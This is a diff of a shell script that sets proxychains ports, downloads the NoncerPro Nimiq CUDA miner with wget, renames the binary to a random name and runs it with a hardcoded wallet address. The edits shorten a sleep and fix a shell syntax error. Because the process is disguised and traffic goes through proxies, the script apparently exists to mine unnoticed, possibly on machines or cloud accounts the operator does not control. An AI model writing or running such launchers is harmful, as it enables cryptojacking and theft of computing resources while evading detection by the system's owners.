@@ -17,7 +17,7 @@ sed -i "s/9051/${port2}/g"  /etc/proxychains.conf
 sed -i "s/9052/${port3}/g"  /etc/proxychains.conf
 sed -i "s/9053/${port4}/g"  /etc/proxychains.conf
 sed -i "s/9054/${port5}/g"  /etc/proxychains.conf
-sleep 10
+sleep 3
 #sed -i 's/proxy_dns/#proxy_dns/g'  /etc/proxychains.conf
 #proxychains curl ifconfig.me
 name=$RANDOM
@@ -32,7 +32,7 @@ then
     else
         ./$name -t cuda -a "NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U" -p $2 $3
     fi
-then
+else
     wget https://github.com/NoncerPro/noncerpro-nimiq-cuda/releases/download/v3.3.0/noncerpro-cuda-linux-3.3.0.tar.gz -O noncerpro-cuda-linux-3.3.0.tar.gz 
     tar xvzf noncerpro-cuda-linux-3.3.0.tar.gz
     mv noncerpro  $name 
